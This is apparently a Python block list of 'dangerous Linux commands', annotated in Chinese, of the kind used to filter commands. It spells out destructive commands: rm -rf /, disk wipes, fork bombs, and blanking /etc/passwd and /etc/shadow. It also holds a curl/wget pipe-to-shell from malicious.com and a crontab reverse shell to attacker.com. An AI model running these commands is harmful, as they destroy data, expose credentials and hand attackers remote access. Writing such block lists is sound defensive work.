# Linux 危险命令列表

dangerous_commands = [
    # 1. 删除命令（最危险）
    "rm -rf /",                    # 删除根目录所有文件
    "rm -rf /*",                   # 删除根目录所有文件（通配符版本）
    "rm -rf .",                    # 删除当前目录所有文件
    "rm -rf ~",                    # 删除家目录所有文件
    "rm -rf /home",                # 删除home目录
    "rm -rf /etc",                 # 删除系统配置目录
    "rm -rf /usr",                 # 删除用户程序目录
    "rm -rf /var",                 # 删除系统变量目录
    "rm -rf --no-preserve-root /", # 绕过保护删除根目录
    
    # 2. 格式化/磁盘操作
    "mkfs",                        # 格式化磁盘
    "mkfs.ext4 /dev/sda",          # 格式化指定磁盘
    "mkfs.ntfs /dev/sda1",         # 格式化分区
    "dd if=/dev/zero of=/dev/sda", # 清空磁盘数据
    "dd if=/dev/urandom of=/dev/sda bs=1M", # 随机数据覆盖磁盘
    "fdisk /dev/sda",              # 磁盘分区工具
    "cfdisk /dev/sda",             # 磁盘分区工具
    "parted /dev/sda",             # 磁盘分区工具
    
    # 3. Fork炸弹（系统资源耗尽）
    ":(){ :|: & };:",              # 经典的fork炸弹
    "fork() { fork | fork & }; fork", # fork炸弹变种
    "perl -e 'fork while fork'",   # Perl版fork炸弹
    "python3 -c 'import os; [os.fork() for _ in range(100000)]'", # Python版
    
    # 4. 内存耗尽攻击
    "cat /dev/zero > /dev/null &", # 无限消耗内存
    "stress --vm-bytes $(awk '/MemFree/{printf '%d\\n', $2 * 0.9;}' < /proc/meminfo)k --vm-keep -m 1", # 内存压力测试
    
    # 5. 系统崩溃/重启
    "echo 1 > /proc/sys/kernel/sysrq && echo b > /proc/sysrq-trigger", # 立即重启
    "echo 1 > /proc/sys/kernel/sysrq && echo c > /proc/sysrq-trigger", # 系统崩溃
    "echo o > /proc/sysrq-trigger", # 关机
    "halt -f",                     # 强制关机
    "poweroff -f",                 # 强制断电
    "reboot -f",                   # 强制重启
    "systemctl isolate runlevel0.target", # 关机
    "systemctl isolate runlevel6.target", # 重启
    "shutdown ",
    "reboot",
    
    # 6. 权限/所有权修改
    "chmod -R 777 /",              # 修改根目录权限为777
    "chmod -R 000 /",              # 修改根目录权限为000
    "chown -R root:root /",        # 修改所有文件所有权
    "chmod +s /bin/bash",          # 设置SUID位
    
    # 7. 删除系统命令
    "rm -rf /bin",                 # 删除系统命令目录
    "rm -rf /sbin",                # 删除系统管理命令
    "rm -rf /usr/bin",             # 删除用户命令目录
    "rm -rf /usr/sbin",            # 删除用户管理命令
    
    # 8. 内核模块操作
    "rmmod ext4",                  # 移除文件系统模块
    "rmmod nfs",                   # 移除网络文件系统模块
    "modprobe -r",                 # 移除模块
    
    # 9. 网络破坏
    "iptables -F",                 # 清空防火墙规则
    "iptables -P INPUT DROP",      # 禁止所有输入
    "iptables -P OUTPUT DROP",     # 禁止所有输出
    "iptables -P FORWARD DROP",    # 禁止所有转发
    "route del default",           # 删除默认路由
    "ifconfig eth0 down",          # 关闭网卡
    "ip link set eth0 down",       # 关闭网卡
    
    # 10. 进程/服务操作
    "kill -9 -1",                  # 杀死所有进程
    "killall -9",                  # 杀死所有指定进程
    "pkill -9",                    # 杀死匹配进程
    "systemctl stop sshd",         # 停止SSH服务
    "systemctl stop network",      # 停止网络服务
    "service --status-all | grep + | awk '{print $1}' | xargs -I {} service {} stop", # 停止所有服务
    
    # 11. 系统配置破坏
    "echo '' > /etc/passwd",       # 清空用户数据库
    "echo '' > /etc/shadow",       # 清空密码数据库
    "echo '' > /etc/fstab",        # 清空文件系统表
    "echo '' > /etc/hosts",        # 清空主机文件
    "echo '' > /etc/resolv.conf",  # 清空DNS配置
    
    # 12. 文件系统操作
    "mount -o remount,ro /",       # 只读挂载根目录
    "mount -o remount,noexec /",   # 禁止执行挂载
    "umount /",                    # 卸载根目录
    
    # 13. 符号链接攻击
    "ln -sf /dev/zero ~/.bashrc",  # 破坏bash配置
    "ln -sf /dev/null /etc/passwd", # 破坏用户数据库
    
    # 14. 系统日志破坏
    "echo '' > /var/log/messages", # 清空系统日志
    "echo '' > /var/log/syslog",   # 清空系统日志
    "rm -rf /var/log/*",           # 删除所有日志
    
    # 15. Crontab破坏
    "echo '* * * * * rm -rf ~' | crontab -", # 定时删除家目录
    "echo '* * * * * /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1' | crontab -", # 定时反弹shell
    
    # 16. 环境变量破坏
    "export PATH=''",              # 清空PATH变量
    "export LD_LIBRARY_PATH=''",   # 清空库路径
    
    # 17. 磁盘空间耗尽
    "cat /dev/zero > /tmp/bigfile", # 创建无限大文件
    "fallocate -l 100G /tmp/huge", # 预分配大文件
    "yes > /tmp/largefile",        # 生成大文件
    
    # 18. 历史记录清除
    "history -c",                  # 清除命令历史
    "echo '' > ~/.bash_history",   # 清空历史文件
    "rm -f ~/.bash_history",       # 删除历史文件
    
    # 19. SSH密钥破坏
    "rm -rf ~/.ssh",               # 删除SSH密钥
    "echo '' > ~/.ssh/authorized_keys", # 清空授权密钥
    
    # 20. 恶意下载执行
    "wget http://malicious.com/evil.sh -O- | sh", # 下载并执行脚本
    "curl http://malicious.com/evil.sh | bash",   # 下载并执行脚本
    
    # 21. 系统信息泄露
    "cat /etc/shadow",             # 查看密码哈希
    "cat /proc/self/environ",      # 查看环境变量（可能包含密钥）
    
    # 22. 端口/服务扫描
    "nmap -sS 192.168.1.0/24",     # SYN扫描
    "masscan -p1-65535 192.168.1.0/24", # 端口扫描
    
    # 23. Shell配置破坏
    "echo 'alias ls=\"rm -rf\"' >> ~/.bashrc", # 修改别名
    "echo 'export PS1=\"\"' >> ~/.bashrc",     # 清空提示符
    
    # 24. 特殊设备文件操作
    "echo 1 > /proc/sys/vm/drop_caches", # 清空缓存（可能影响性能）
    "echo 0 > /proc/sys/kernel/printk",  # 关闭内核打印
]

